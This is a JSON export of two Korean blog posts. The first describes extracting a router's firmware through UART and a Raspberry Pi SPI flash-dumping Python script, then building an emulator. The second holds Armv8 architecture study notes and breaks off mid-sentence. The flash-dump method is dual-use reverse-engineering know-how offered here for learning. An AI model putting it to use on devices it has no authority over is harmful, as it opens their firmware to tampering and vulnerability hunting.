[{"content":"계기 이번년도 초에 BoB 교육기간중에 갑자기 흥미가 생겨서 친구의 고물 라우터를 빼았았고 센터 뒤에서 무작정 UART에 땜질을 시작했다. 할 수 있다고 억지부리다가 부숴먹고 오기가 생겨서 더 하다가 또 부숴먹고 하나 또 구매했다.\n멸망 당연하지만 알리산 3천원 땜질기로는 제대로된 땜질을 할 수 없었고 이걸로 열심히 기판을 지지다 망가뜨렸다. 알리에서 열풍기를 포함한 땜질 키트와 방진 마스크를 사서 다시 시도했다. 열풍기 써보려고 테스트하다 또 하나 더 부숴먹고 조심히 다시 시작했다.\n구원 쿠팡에서 제일 위에 떠있는 라우터를 사왔다. 제일 기본적으로 디버깅 인터페이스부터 찾으려고 했다. JTAG나 UART가 어디 없나 찾던중 UART를 찾은것 같았다. 앞서 부숴먹은 라우터들의 경험을 바탕으로 열풍기를 잘 이용해가면서 USB to TTL을 손수 땜질을 했고, 시리얼 포트로 접속했다. baudrate를 맞춰야해서 인터넷에서 자주 사용되는 baudrate를 하나 하나 손수 넣어보면서 제대로된 출력이 나올때까지 기다렸다.\nBooting... init_ram bond:0x00000005 MCM 128MB dram_init_clk_frequency ,ddr_freq=1066 (Mbps), 533 (MHZ) DRAM init disable DRAM init enable DRAM init is done , jump to DRAM enable DRAM ODT SDR init done dev_map=0xb8142000 Detect page_size = 2KB (3) Detect bank_size = 8 banks(0x00000002) Detect dram size = 128MB (0x08000000) DDR init OK init ddr ok DRAM Type: DDR2 DRAM frequency: 533MHz DRAM Size: 128MB JEDEC id EF4018, EXT id 0x0000 found w25q128 flash vendor: Winbond w25q128, size=16MB, erasesize=4KB, max_speed_hz=29000000Hz auto_mode=0 addr_width=3 erase_opcode=0x00000020 Write PLL1=80c00042 =\u0026gt;CPU Wake-up interrupt happen! GISR=89000080 ---Realtek RTL8197F-VG boot code at 2023.08.24-12:28+0900 v3.4.14.2 (999MHz) bootbank is 1, bankmark 80000001, forced:0 no rootfs signature at 00330000! 이런식으로 부팅이 되는걸 UART로 볼 수 있었고, 정확한 맵인진 모르겠지만 다음과 같은 플래시 맵도 보였다\nloop: module loaded m25p80 spi0.0: change speed to 15000000Hz, div 7 JEDEC id EF4018 m25p80 spi0.0: found w25q128, expected m25p80 flash vendor: Winbond m25p80 spi0.0: w25q128 (16384 Kbytes) (2;000000 Hz) Creating 6 MTD partitions on \u0026#34;m25p80\u0026#34;: 0x000000000000-0x000000340000 : \u0026#34;boot+cfg+linux(bank1)\u0026#34; 0x000000340000-0x000000800000 : \u0026#34;root fs(bank1)\u0026#34; 0x000000800000-0x000000b40000 : \u0026#34;linux(bank2)\u0026#34; 0x000000b40000-0x000001000000 : \u0026#34;root fs(bank2)\u0026#34; 0x000000fe0000-0x000001000000 : \u0026#34;flatfs\u0026#34; 0x000000000000-0x000001000000 : \u0026#34;all image\u0026#34; tun: Universal TUN/TAP device driver, 1.6 tun: (C) 1999-2004 Max Krasnyansky \u0026lt;maxk@qualcomm.com\u0026gt; PPP generic driver version 2.4.2 NET: Registered protocol family 24 MPPE/MPPC encryption/compression module registered Realtek WLAN driver - version 3.8.0(2017-12-26)(SVN:) Adaptivity function - version 9.7.07 Do MDIO_RESET bootshell이 뜰거란 행복회로를 돌렸지만 어림도 없었고 일종의 매직키가 있나 싶어서 serial 포트에 연결해서 매직키 알려진 것들을 자동으로 막 보내는 스크립트도 열심히 작성했지만 아무것도 동작하지 않았다.\nSPI Dump 이렇게 연결된다고 한다. MISO, MOSI가 데이터 보내고 받는 핀이니 저렇게 연결했다. SPI flash를 읽는건 라즈베리파이에서도 지원하길래 데이터시트를 검색해서 그거대로 연결했다. 되었다가 안되었다가해서 핀을 계속 다시 연결했다. 이대로 파이썬으로 간단하게 코드를 구현했지만 어림도 없었다. 그래서 다시 차근 차근 데이터시트를 읽어보고 실제로 세팅하지 않아도 되는 핀들이나 세팅해야하는 핀들을 세팅했다.\n예제 코드들 구글링하던 도중 default CE chip enable하고 읽는 코드도 있길래 그러고 읽어도 어떨때는 제대로 읽혔다. 그래도 메뉴얼대로 spi_cs off 하고 issue하고 다시 on해서 구현했더니 그래도 데이터가 나오기 시작했다. 메모리 맵을 참고해서 쭉 파일시스템 추출을 시도했지만 생각보다 되게 불안정해서 클록 신호가 안맞는건지 조금만 흔들려도 데이터의 손실이 발생했다.\n#!/usr/bin/env python3 import gpiozero import spidev import time import tqdm import os #winbond_reset = gpiozero.LED(\u0026#34;GPIO0\u0026#34;) winbond_reset = gpiozero.OutputDevice(\u0026#34;GPIO0\u0026#34;) #winbond_wp = gpiozero.LED(\u0026#34;GPIO3\u0026#34;) winbond_wp = gpiozero.OutputDevice(\u0026#34;GPIO3\u0026#34;) #spi_cs = gpiozero.LED(\u0026#34;GPIO2\u0026#34;) spi_cs = gpiozero.OutputDevice(\u0026#34;GPIO2\u0026#34;) winbond_reset.off() winbond_wp.off() spi_cs.on() print(\u0026#34;Starting up...\u0026#34;) time.sleep(1) # Set /RESET high taking the Winbond out of reset state. # Set /WP high to make the chip\u0026#39;s memory writable. winbond_reset.on() winbond_wp.on() spi = spidev.SpiDev() spi.open(0, 0) spi.mode = 0 spi.lsbfirst = False spi.max_speed_hz = 1000000 spi_cs.off() ids = spi.xfer2([ 0x90, 0x00, 0x00, 0x00, 0x00, 0x00 ]) spi_cs.on() spi_cs.off() status_1 = spi.xfer2([ 0x05, 0x00 ]) spi_cs.on() spi_cs.off() \u0026#39;\u0026#39;\u0026#39; loop: module loaded m25p80 spi0.0: change speed to 15000000Hz, div 7 JEDEC id EF4018 m25p80 spi0.0: found w25q128, expected m25p80 flash vendor: Winbond m25p80 spi0.0: w25q128 (16384 Kbytes) (2;000000 Hz) Creating 6 MTD partitions on \u0026#34;m25p80\u0026#34;: 0x000000000000-0x000000340000 : \u0026#34;boot+cfg+linux(bank1)\u0026#34; 0x000000340000-0x000000800000 : \u0026#34;root fs(bank1)\u0026#34; 0x000000800000-0x000000b40000 : \u0026#34;linux(bank2)\u0026#34; 0x000000b40000-0x000001000000 : \u0026#34;root fs(bank2)\u0026#34; 0x000000fe0000-0x000001000000 : \u0026#34;flatfs\u0026#34; 0x000000000000-0x000001000000 : \u0026#34;all image\u0026#34; tun: Universal TUN/TAP device driver, 1.6 tun: (C) 1999-2004 Max Krasnyansky \u0026lt;maxk@qualcomm.com\u0026gt; PPP generic driver version 2.4.2 NET: Registered protocol family 24 MPPE/MPPC encryption/compression module registered Realtek WLAN driver - version 3.8.0(2017-12-26)(SVN:) Adaptivity function - version 9.7.07 \u0026#39;\u0026#39;\u0026#39; data = spi.xfer2([ 0x0b]+[0]*3) print([hex(x) for x in data[2:]]) spi_cs.on() data = spi.xfer2([0x9f] + [0]*3) print([hex(x) for x in data[2:]]) print(\u0026#34;ids=\u0026#34; + str(ids)) print(\u0026#34;status_1=\u0026#34; + str(status_1)) print(\u0026#34;JEDEC_ID=\u0026#34; + str(data)) def dump(filename, address, size): if os.path.isfile(filename): os.remove(filename) f = open(filename,\u0026#39;ab\u0026#39;) sz = 0x30 for i in tqdm.tqdm(range(size//sz+sz)): it = i*sz + address addr = [(it\u0026gt;\u0026gt;16)\u0026amp;0xff, (it\u0026gt;\u0026gt;8)\u0026amp;0xff, (it)\u0026amp;0xff] spi_cs.off() data = spi.xfer3([ 0x03]+ addr + [0] *(sz))[4:] # first 4bytes invalid spi_cs.on() assert len(data) == sz f.write(bytes(data)) f.close() #dump(\u0026#39;./boot.cfg.linux1\u0026#39;,0 ,0x000000340000-0x000000000000) #dump(\u0026#39;./rootfs_bank1.1\u0026#39;,0x000000340000,0x000000800000-0x000000340000) #dump(\u0026#39;./rootfs_bank2.2\u0026#39;,0x000000b40000,0x000001000000 - 0x000000b40000) #dump(\u0026#39;./flatfs\u0026#39;,0x000000fe0000,0x000001000000-0x000000fe0000) dump(\u0026#39;./linux_bank2\u0026#39;,0x000000b40000,0x000000b40000-0x000000800000) spi.close() 그래서 열심히 맵을 보고 같은 영역을 5번 정도씩 읽고 md5를 비교해서 같은 md5를 가진 파일들로 걸러냈다. init script를 분석해봤는데 cgi 바이너리를 돌리는 것을 확인했고 테스트를 해보려는데 생소한 라이브러리를 사용해서 qemu로 에뮬레이션하는데 실패했다. 그래서 뭔가 나중에 에뮬레이터 하나 만들어서 이거 돌려보면 재밌을것 같아서 미뤄두고 까먹고 있었다.\nEmulator 개발 dynamic linked binary인데 어떻게 환경을 유사하게 맞출 수 있을까 고민을 하다가 기본적인 커널 로더만 구현하고 유저에선 이미 ld라는 로더가 있으니 얘까지만 메모리에 올리고 잘 조건 맞추면 알아서 실행되지 않을까라고 생각했고 나중에 크로스아키텍처 퍼징을 위해서 syscall도 후킹하듯이 대체해서 입력도 넣을 수 있고, 라이브러리도 그냥 후킹해서 속이면 편하게 할 수 있을 것이라고 생각했다. 약간 qemu user static 인데 실질적으로 필요없는 시스콜 구현도 마음대로 생략하고 후킹도 마음대로 걸 수 있도록 하고 싶었다. 좀 불필요한 구현들을 사용자가 마음대로 빼고 후킹도 걸 수 있으면 상당히 편할것이라고 생각했다. 마침 학교에서 프로젝트를 내라고 하길래 이걸 구현하기로 했다.\n선행 연구들을 조금 찾아보았는데 이미 이런 아이디어를 가지고 파이썬으로 구현한 프로젝트가 있었다. https://github.com/qilingframework/qiling 근데 이걸 퍼징할때도 쓰는것 같았다. 파이썬으로 구현된 에뮬레이터를 이용해서 퍼징을 돌리는 것 보다는 C가 훨씬 빠르니 바로 C로 구현을 시작했다. 열심히 메모리를 봐가면서 커널 로더가 어떤 동작을 수행하는지 분석했고 그대로 구현했다. https://github.com/msh1307/N.2-EMUl 오랫동안 개발한 프로젝트는 아니라서 시스템콜도 일부만 지원되고 x86_64 아키텍처만 된다. MIPS도 추가해야하는데 귀차니즘 이슈로 멸망했다. 나중에 MIPS도 마저 개발해서 저걸로 퍼징한번 돌려보고 싶다.\n","permalink":"https://msh1307.kr/blog/router_firmware_extraction_emulator_dev/","summary":"계기 이번년도 초에 BoB 교육기간중에 갑자기 흥미가 생겨서 친구의 고물 라우터를 빼았았고 센터 뒤에서 무작정 UART에 땜질을 시작했다. 할 수 있다고 억지부리다가 부숴먹고 오기가 생겨서 더 하다가 또 부숴먹고 하나 또 구매했다.\n멸망 당연하지만 알리산 3천원 땜질기로는 제대로된 땜질을 할 수 없었고 이걸로 열심히 기판을 지지다 망가뜨렸다. 알리에서 열풍기를 포함한 땜질 키트와 방진 마스크를 사서 다시 시도했다. 열풍기 써보려고 테스트하다 또 하나 더 부숴먹고 조심히 다시 시작했다.\n구원 쿠팡에서 제일 위에 떠있는 라우터를 사왔다.","title":"Router firmware extraction \u0026 ld based emulator development"},{"content":"Background - arm A1 Introduction to the Armv8 Architecture A1.1 About Arm Architecture Arm 아키텍처는 RISC로 reduced instruction set computer이다. 다음과 같은 특징이 있다.\n많은 레지스터터 개수 load/store 아키텍처, 바로 memory에 작성을 허용치 않고 무조건 register를 거쳐서 load/store이 진행된다. 간단한 addressing mode, 모든 store/load address는 register와 명령 필드로만 addressing된다. 매우 중요한 특징으로 Arm 아키텍처 퍼포먼스나 사이즈나 전력 소모량에 따라 여러 구현이 존재한다.\nArmv8의 중요한 특징은 호환성이다.\n64-bit Execution state, AArch64 32-bit Execution state, AArch32 - 또한 이전 버전의 Arm 아키텍처와 모두 호환된다. A1.2 Architecture profiles Arm은 다음과 같이 아키텍처 프로필을 나타낸다.\nA - Application profile MMU를 기반으로 Virtual Memory System Architecture를 지원한다. ex) Armv8-A 구현은 AArchv8-A로도 불린다. A64, A32, T32 명령어 세트를 지원한다. R - Real-time profile MPU를 기반으로 Protected Memory System Architecture를 지원한다. A32, T32 명령어 세트를 지원한다. M - Microcontroller profile 저지연 인터럽트 처리를 위해 설계된 프로그래머를 위한 프로필이다. R 프로필 PMSA(Protected Memory System Architecture)의 다른 아키텍처를 구현한다. T32 변종 명령어 세트를 지원한다. 다음은 추가적으로 알아야할 정보들이다.\nMMU Memory Management Unit 가상 메모리 주소를 물리 메모리 주소로 변환한다. 다음과 같은 구조이다. 옛날에는 따로 CPU와 분리되어있었다. 동작 방식 가상 메모리를 2^n 비트의 크기로 나누고, 특정 페이지는 실제 물리 메모리의 하나의 프레임에 대응된다. CPU는 가상 주소를 MMU로 넘긴다. MMU는 TLB를 확인해서 변환 정보를 확인하고 만약 해당 데이터가 있다면 그 데이터를 이용한다. TLB에 원하는 데이터가 없다면 (TLB miss) 페이지 테이블을 이용해서 가상 메모리 주소의 뒤쪽 n 비트는 건들지 않고 앞쪽 나머지 비트를 물리 메모리의 프레임으로 변환한다. TLB나 페이지 테이블을 통해 실제로 주소를 가져오지 못하는 상황을 page fault라고 부른다. 이 경우엔 여유 공간에 페이지를 할당해서 연결시키거나, 디스크로 페이지를 내리고 할당한다. MPU Memory Protection Unit 4gb 메모리 공간 내에서 다양한 메모리 영역별로 권한을 설정할 수 있게 해주는 프로그래밍 가능한 유닛이다. 모든 메모리 액세스는 MPU에 의해 모니터링된다. 절대 명령어 fetch가 일어나지 않는 영역을 설정하여 Memory corruption으로 인해 악의적인 코드가 실행되는 것을 방지한다. 다음과 같은 모습으로 동작한다. MPU_MAIR에는 XN (Execute Never) 같은 속성들이 정의되고 MPU_RLAR은 MPU_MAIR 레지스터를 가리킨다. TrustZone이 지원된다면, Secure state에서의 MPU 레지스터들도 존재한다. 반대 Non-secure state에서도 이러한 MPU 레지스터들이 존재한다. A1.3 Armv8 architectural concepts armv8의 네 가지 중요한 feature가 있다.\nExecution state Instruction sets System registers Debug A1.3.1 Execution state Execution state는 Processing Element, PE의 실행 환경을 정의한다.\nExecution state 지원되는 레지스터의 widths - ex) 64bit, 32bit \u0026hellip; 지원되는 명령어 세트 중요한 측면 Execution model VMSA (Virtual Memory System Architecture) 프로그래머 모델 AArch64 64 bit Execution state PC, SP, \u0026hellip; , X30 레지스터, ELR 정확히는 SP 레지스터들과 Exception Link 레지스터들도 지원한다. ELR의 의의는 따로 직접 메모리에 Exception 발생시 리턴 주소를 기록하지 않고 따로 리턴 주소를 기록하는 레지스터를 둬서 퍼포먼스를 올리는 것에 있다. A64 라는 하나의 명령어 셋만 지원된다. armv8의 Exception model을 4개의 Exception level, EL0 ~ EL3를 정의한다. Execution privilege hierarchy 로 권한의 level을 지정한다. System register에 접미사를 붙여서 가장 낮은 Exception level만 레지스터에 접근할 수 있도록 한다. PE의 현재 state를 정의하는 PSTATE 원소의 개수를 정의한다. A64에선 이 PSTATE 원소를 수정하는 명령어가 지원된다. AArch32 32 bit Execution state 32-bit PC, SP, LR, \u0026hellip; , 32 bit 범용 레지스터 AArch64와 다르게 하나의 LR 레지스터를 ELR 레지스터로도 이용한다. SP도 하나이다. PE의 모드에 따라서 복수개의 banked 레지스터가 존재할 수 있다. 겉으로는 안보이지만 프로세서 모드가 변경됨에 따라 일대일로 매핑된다. A32, T32 명령어 세트가 지원된다. Armv7 Exception model을 지원한다. AArch64와 동일하게 PSTATE 를 수정하는 명령이 지원된다. APSR (Application Program Status Register)나 CPSR (Current Program Status Register)를 이용해서 접근한다. 공통적으로 Exception level에 대한 정보나 조건 플래그 등이 포함된다. PSTATE의 필드는 다음과 같다. CPSR은 현재 프로그램의 status를 저장하는 레지스터이다. CPSR은 다음과 같다. SPSR은 Saved Program Status Register로 CPSR을 백업해놓는 레지스터이다. exception이 발생했을때 SPSR에 CPSR을 백업하고 나중에 끝나면 CPSR을 CPSR로 복사해서 복원한다. PSTATE는 CPSR과 1:1 대응되는 개념은 아니지만 AArch64에선 CPSR 필드의 각 값을 PSTATE로 정의한다. AArch64나 AArch32로 Execution state를 변경하는 것은 Exception level의 변경만으로도 수행이 가능하다. 다른 OS나 application, kernel, hypervisor가 다른 exception level이라면 다른 execution state에서 돌 수도 있다는 뜻이다.\nA1.3.2 The Armv8 instruction sets AArch64 A64 32 bit 인코딩을 이용한 고정 길이 명령어를 이용한다. AArch32 A32 32 bit 인코딩을 이용한 고정 길이 명령어를 이용한다. T32 16 bit 와 32 bit 명령어 인코딩을 이용한 가변 길이 명령어를 이용한다. 이전 문서에선 Thumb mode라고도 말했다. A1.3.3 System registers 대부분의 시스템 레지스터들은 \u0026lt;register_name\u0026gt;_ELx의 형태를 취하고 있다. 뒤에 x는 EL0같이 그 레지스터를 접근할 수 있는 최소의 Exception level이 명시되어있다.\nB1 The AArch64 Application Level Programmers’ Model B1.3 Software control features and EL0 EL0에서의 software control feature에 대해 설명한다.\nB1.3.1 Exception handling Arm 아키텍처에서 exception은 프로그램의 실행흐름을 바꾼다. 그리고 이를 처리하는 특정 exception handler는 EL0 보다 높은 exception level에서 동작하며 vector에 정의되어있다.\nException 들은 다음을 포함한다.\nInterrupts. Memory system aborts. UNDEFINED 명령에 대한 실행으로 발생하는 exceptions. System calls. Secure monitor or Hypervisor traps. Debug exceptions. D1 The AArch64 System Level Programmers’ Model D1.1 Exception levels Armv8-A 아키텍처는 EL0 ~ EL3 까지의 Exception level이 존재한다.\nELn ELn에서 n이 증가할 수록 execution privilege는 증가한다. EL0에서의 실행은 unprivileged execution이라고 불린다. EL2부터는 가상화를 지원한다. EL3에선 Secure state와 Normal state 변경을 지원한다. EL3에선 Secure monitor를 포함한 저수준 펌웨어가 위치한다. 위와 같은 구조를 가지고 있다. EL2와 EL3는 하이퍼바이저가 지원되는지, secure monitor가 지원되는지에 따라 없을수도 있을 수도 있다. 또한 PE는 무조건 연속적으로 Exception level을 구현할 필요가 없다. 예를 들어서 EL0, EL1, EL3만 구현하는 것도 가능하다. 위처럼 EL2만 빼고 구현되는 경우도 있다. D1.1.1 Typical Exception level usage model 일반적으로 다음과 같은 전형적인 사용 모델이 존재한다.\nEL0 - Applications EL1 - OS kernel EL2 - Hypervisor EL3 - Secure Monitor D1.2 Exception terminology exception의 용어에 대해서 설명한다.\nexception과 interrupt는 ARM에서 엄밀하게 구분하지 않는다. 왜냐하면 exception도 일종의 synchronous interrupt라고 부르기도 하기 때문이다. B1.3.1에서 exceptions에는 interrupts도 포함된다고 명시해놓기도 했다.\nexception - 프로그램 실행 도중 동기적으로 발생하는 이벤트이다.\n딱 정해진 기준이 있는 synchronous interrupt이다. 예를 들어서 system call이나 division by zero 같은 명확한 기준이 존재한다. interrupt - 비동기적으로 발생하는 이벤트이다.\nhardware interrupt 하드웨어에서 비동기적으로 이벤트가 일어나서 명령어 흐름이 방해받는 경우를 말한다. software interrupt 명령어로 실행되는 interrupt이다. ex) x86의 INT 그리고 여기서의 동기 비동기를 조금 다르게 보면 exception은 CPU 내부 요인에 의해 발생했고, interrupt는 외부 요인에 의해 발생했다고도 볼 수 있다. Interrupt Request (IRQ)\n일반적인 interrupt가 여기에 속한다. Fast Interrupt Request (FIQ)\nIRQ보다 우선순위가 높다. 별도의 레지스터가 있어 처리가 빠르다. 이는 banked register를 말한다. ex) R7_fiq, \u0026hellip;, R14_fiq 이런식의 banked register를 둬서 context switching 비용을 아낄 수 있다. 빠른 처리를 위해 쓰이기도 한다. D1.2.3 Exception level ELn에서 n이 크면 높은 Exception level이라고 하고, 반대도 마찬가지다. 다음과 같이 표현한다.\nAArch64 Execution state에선 AArch64의 Exception level을 사용한다. AArch32 Execution state에선 AArch32의 Exception level을 사용한다. D1.2.4 Definition of a precise exception 위 사진은 precise exception과 imprecise exception에 대해서 나와있다.\nprecise exception exception handler가 PE state와 memory system state를 넘겨받는 경우이다. 이때 PE의 전 명령어들은 모두 실행되었다는 것이 보장된다. imprecise exception 전 명령들이 실행되었다는 보장이 없다. 현대 프로세서들은 파이프라이닝같은 병렬 실행을 통해 퍼포먼스를 향상시키기 이러한 imprecise exception도 발생할 수 있다. AArch64의 LDP, STP 같이 하나 이상의 single-copy atomic memory 액세스를 하는 경우엔 레지스터나 메모리에 값이 반영이 안될 수 있다.\nD1.2.5 Definitions of synchronous and asynchronous exceptions synchronous exception\nexception이 명령어의 실행 or 실행 시도에 의해 생성되는 동기 exception이다. return address가 exception handler에게 넘어가는 것이 보장된다. 즉 어떤 명령어가 exception을 발생시켰는지 식별할 수 있다. precise exception에 해당한다. asynchronous exception\nexception이 명령어 스트림의 실행 or 실행 시도에 의해 생성되는 경우이다. return address가 exception handler에게 넘어가는 것이 보장되지 않는다. 어떤 명령어가 exception을 발생시켰는지 식별할 수 없다. imprecise exception에 해당한다. D1.3 Execution state AArch64 - 64bit execution state AArch32 - 32bit execution state Exception levels는 Exception state를 이용한다. 예를 들어서 EL0, EL1, EL2는 모두 AArch32를 이용할 수 있고 EL3 혼자 AArch64에서 돌아갈 수 있다.\n그 뜻은 다음과 같다.\n다른 software 계층, 각자 다른 exception level에서 동작하는 application, os kernel, hypervisor 들은 다른 execution state에서 실행될 수 있다. PE는 execution state를 다음과 같은 경우에 한해서만 변경 가능하다 . Reset시 Exception level의 변경 D1.4 Security state Armv8-A 아키텍처는 두 가지 security states를 지원한다. security states는 Non-secure state와 Secure state로 나뉜다.\n물리 메모리 주소 공간 차이 Secure state PE가 Non-secure physical address와 Secure physical address 모두 접근이 가능하다. Non-secure state PE는 오직 Non-secure physical address만 접근 가능하다. Secure system이 관리하는 자원에 접근은 불가능하다. D1.4.1 The Armv8-A security model 만약 EL3가 구현에 포함되어있다면, 무조건 두 가지의 security states가 포함된다. EL3는 오직 Secure state에만 존재한다. Non-secure state에서 Secure state로의 전환은 오직 EL3로의 Exception에 의해서만 발생한다. FEAT_SEL2가 구현되지 않았다면 EL2는 Non-secure state에만 존재한다. 만약 구현되었다면, EL2는 secure state에서 존재한다. 어떻게 virtual address가 Non-secure physical address와 secure physical address로 변환되는지는 D5에서 후술한다. D1.5 Virtualization 가상화 기술은 모두 가상화 소프트웨어의 성능을 높히고자 하드웨어단에서 여러 옵션을 추가한 것이다.\n가상화 지원은 EL2를 포함한 구현에만 적용된다. 기본적인 가상화 모델은 다음과 같다.\nHypervisor 는 EL2에서 돌아가며 EL0와 EL1을 포함하는 가상 머신의 switching을 담당한다. Guest OS는 EL1에서 동작한다. Application은 주로 EL0에서 동작한다. 하이퍼바이저는 VMID를 각자의 가상머신에 할당한다.\nEL2는 Guest OS 관리와 다음과 같은 제어를 한다.\nGuest OS에 의해 레지스터 읽기가 일어나면 가상 값을 리턴한다. Various Trap operations 메모리 관리와 다른 레지스터에 접근한다. Trap된 operation은 EL2에 exception을 발생시키게된다. interrupt들의 라우팅 현재의 Guest OS에게 라우팅되는 경우가 있다. 현재 돌고 있지 않은 Guest OS에게 라우팅되는 경우가 있다. 그리고 마지막으로 하이퍼바이저에게 라우팅되는 경우가 존재한다. Armv8.1은 Virtualization Host Extensions (VHE)을 통해 Type 2 hypervisor를 지원한다. 간단하게 설명하자면 Host OS가 EL2에서 동작하도록 하는 extension이다. 그런데 도대체 상식적으로 어떻게 Host OS가 EL2에서 동작할지 이해가 되지 않을 수 있는데, 이는 뒤에서 마저 설명한다.\nEL2는 다음과 같은 요소들을 구현한다.\n구현은 EL2와 EL2 변환 과정의 독립적인 메모리 액세스를 보장한다. FEAT_VHE가 지원되면 EL2, EL0에서의 액세스에 변환 과정을 구현한다. EL1\u0026amp;0의 translation regime는 크게 두 가지 스텝을 거친다. Virtual Address (VA)를 Intermediate Physical Address (IPA)로 변환한다. 이는 EL1에서 처리되는데, Guest OS는 이 IPA를 PA로 믿고 처리한다. IPA를 실제 PA에 매핑한다. 이는 EL2에서 처리되며 당연하지만 Guest OS는 이를 알 수 없다. 이를 stage-2 translation이라고도 부른다. 다이어그램으로 나타내면 다음과 같다. 이는 나중에 VMSA 아키텍처에 대해서 설명하면서 2 단계 변환이라는 용어로 다시 나온다. FEAT_NV가 지원된다면 Guest hypervisor가 EL1에서 돌 수 있게 된다. ( Nested virtualization ) Hypervisor type 따로 메뉴얼에 나오는 내용은 아니지만, 나중에 이해를 위해서 꼭 필요한 내용이다. Type 1이 가장 퍼포먼스가 좋다. Type 1은 베어메탈 방식이라고도 불리는데, 그 이유는 하드웨어 위에 하이퍼바이저가 설치되기 때문이다.\nType2는 Host OS 위에 하이퍼바이저가 설치되는데, 개인용 교육용으로 자주 쓰인다. Hosted hypervisor라고도 자주 부른다..\n추가적으로 요즘에 자주 보이는 컨테이너는 Host OS를 공유하고 그 위에 하이퍼바이저 대신 컨테이너 엔진을 통해 퍼포먼스를 높힌다. 하드웨어 수준으로는 가상화되지 않고 OS 수준으로 가상화가 된다. 그래서 Host OS와 Guest OS는 동일한 OS여야 한다. 이를 Type 3 hypervisor라고도 한다.\n모두 이렇게 전형적인 type으로 분류되는건 아니지만 대부분은 이렇게 나눈다.\nhypervisor mode ARM에서 Hypervisor mode를 따로 추가하게 된 배경은 앞에서 설명한 type 1 hypervisor, standalone hypervisor 때문이다.\nCPU가 user와 supervisor mode만 지원하는 상태에서 standalone hypervisor를 구조적으로 설계하려면 user와 supervisor mode 두 가지로 나눈것으로는 부족하다. 당연하겠지만 만약 hypervisor를 supervisor mode에서 돌리고 기존 guest os를 user mode에 올리면 supervisor mode를 염두에 두고 설계된 OS가 동작할 수 없게 된다. 그렇다고 Guest os와 hypervisor를 같은 supervisor mode에 공존하게 하면 기본적으로 격리를 염두에 두고 만들어진 hypervisor의 의미가 없어진다.\n이런 문제를 해결하기 위해서 ARM은 Hypervisor mode를 따로 넣어서 Guest os와의 교통정리를 끝냈다.\n그런데 KVM같은 Type 2 hypervisor, hosted hypervisor의 경우엔 좀 애매하다. Host OS의 모듈의 형태로 동작하는 KVM의 특성상 hypervisor는 일부 기능을 무조건 Host os에게 가져와야한다. 그런데 전통적으로 Host OS는 EL1에서 동작했다. Host os가 EL1에서 동작하면 KVM도 EL1에서 동작해야한다. Guest os보다 더 높은 권한을 가지려면 무조건 EL2에서 동작해야하는데, 기존 Host os가 EL1에서 동작해서 문제가 발생한다.\n이러한 문제를 해결하기 위해서 KVM은 구조를 Lowvisor와 Highvisor로 분할했다. Lowvisor를 hypervisor mode에서 돌리고, VM의 명령을 trap해서 highvisor로 넘긴다. 이런 구조로 나눠버리면, EL1에서 돌도록 설계된 OS 별다른 문제없이 그대로 동작하면 되고 동시에 Hypervisor의 동작도 수행할 수 있다. intel, amd, arm에서 하드웨어적으로 지원해주면, kernel module을 올려서 이러한 lowvisor까지 구현해줄 수 있다.\n겉 모습으로는 기존 하이퍼바이저처럼 권한 체계가 분리된 것으로 보인다. Highvisor가 커널에서 동작하기 때문에 VM을 돌리면서 필요한 기능은 host kernel code를 이용해서 처리할 수 있게 되었다. 그래서 이런식으로 trap이 이중으로 넘어간다. 이러한 Lowvisor은 EL2의 exception vector와 world switch에 대한 코드만 구현하면 되기 때문에 highvisor에 비해서 더 코드가 작다.\n이런 구조가 동작하려면 bootloader에서 처음부터 Hypervisor mode에서 trap handler를 설치해서 나중에 KVM이 돌 수 있도록 해줘야한다. 논문 저자들은 vendor와 얘기해서 새로운 ABI를 어떻게 맞출지 고민하다가 결국 무산되었지만 좀 더 효율적이고 간단한 방법을 찾았다고 한다. 그냥 처음부터 ABI 신경쓰지 않고 bootloader recommendation으로 hypervisor mode로 부팅을 추가하고, kernel 코드를 조금만 수정해서 hypervisor mode 지원 유무를 파악하고 만약 지원된다면 그때 그냥 바로 hypervisor mode에 trap handler install을 해주면 되고 아니면 그냥 원래 legacy kernel 처럼 부팅하고 kvm 지원을 안하면 된다. 그러면 굳이 복잡한 bootloader ABI를 논의할 필요가 아예 없어진다.\nVirtualization host extensions (VHE) 앞서 kvm을 예시로 type 2 hypervisor가 겪을 수 있는 문제를 어떻게 해결했는지에 대해서 알아보았다. VHE는 앞서 Type 2 hypervisor를 지원하기 위해서 생겼다고 했다.\n왜 이 얘기를 했냐면 원래 일반적으로 standalone hypervisor에선 다음과 같이 Exception level이 매핑된다. 만약 이런 구조가 type 2에서도 유지된다면 앞에서 다루었던 문제가 생긴다. 전통적으로 kernel은 EL1에서 돌고, 가상화 컨트롤은 EL2에서 담당했다. 이런 문제는 앞서 해결 방법을 이미 다루었다. VHE는 이러한 문제 해결 방법을 더 최적화시키기 위해 개발되었다. 기존의 방법은 추가적인 context switching이 필요할 수 밖에 없기에 비효율적이다. 위와 같은 방식으로 설계하면 더 좋은 퍼포먼스를 얻을 수 있다. 전에는 kernel -\u0026gt; hypervisor -\u0026gt; guest로 이중 트랩이 걸렸었다면 이제는 host os가 hypervisor에서 돌게 되었으니 훨씬 빨라지게 된다.\nHost OS를 EL2에서 동작시키기 위해서 ARM에선 HCR_EL2의 E2H와 TGE 비트를 추가했다.\nE2H - VHE의 활성화 여부를 결정한다. TGE - VHE가 활성화 되었을 때 EL0가 Guest인지 Host인지를 결정한다. Host OS가 EL2에서 돌더라도 Host application은 EL0에서 돌기 때문에 이를 구분하려면 하드웨어적으로 TGE 비트를 만들어야할 필요가 생긴다. 다음 다이어그램처럼 구분이 된다. 위 다이어그램의 내용을 표로 정리하자면 다음처럼 정리할 수 있다. VHE가 활성화되면 Virtual address space도 달라지게 된다. VHE 이전에는 위처럼 EL0/EL1에는 두 개의 VA range를 지원했고 EL2, EL3에서는 전통적으로 application이 존재하지 않으므로 single VA range 만을 지원했다. 원래 EL0/EL1에선 ASID를 둬서 application별 주소 공간을 명시했다. 때문에 같은 VA에 대한 TLB를 flush할 필요가 없었다. ASID에 대한 자세한 설명은 뒤에 D5.2.1에서 후술한다. EL2에는 host application이 없어서 원래 ASID가 존재하지 않았다.\n그런데 Host OS가 EL2에서 효율적으로 동작하려면 ASID 지원을 추가해야한다. 왜냐하면 FEAT_VHE가 활성화되면 커널이 EL2에서 돌아가기 때문에 EL1에서의 이유와 마찬가지로 context switching시에 VA에 대해서 PA로의 변환을 EL2에서 담당하기 때문이다. MMU는 동일 VA에 대해서 다른 PA로 변환해야하기에 FEAT_VHE의 경우엔 ASID support가 EL2에도 필요할 수 있다는 것이다. 위 